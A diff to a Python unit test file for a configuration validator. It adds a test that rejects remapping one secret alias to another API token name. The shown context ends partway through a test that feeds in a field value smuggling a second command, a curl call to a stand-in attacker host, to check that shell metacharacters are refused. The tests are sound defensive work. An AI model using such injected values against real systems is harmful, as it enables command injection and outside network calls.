@@ -176,6 +176,14 @@ class ConfigValidationTests(unittest.TestCase):
         result = vac.validate_config(config, mode="draft")
         self.assertFalse(result.ok)
 
+    def test_secret_alias_remapping_prohibited(self):
+        config = _good_config()
+        config["secretAliases"]["VERCEL_API_TOKEN"] = "CLOUDFLARE_API_TOKEN"
+        result = vac.validate_config(config, mode="draft")
+        self.assertFalse(result.ok)
+        joined = " ".join(result.errors).lower()
+        self.assertTrue("remap" in joined or "equal" in joined)
+
     def test_shell_metacharacters_fail_without_echoing_value(self):
         config = _good_config()
         dangerous = "agent-arena; curl http://evil.example"
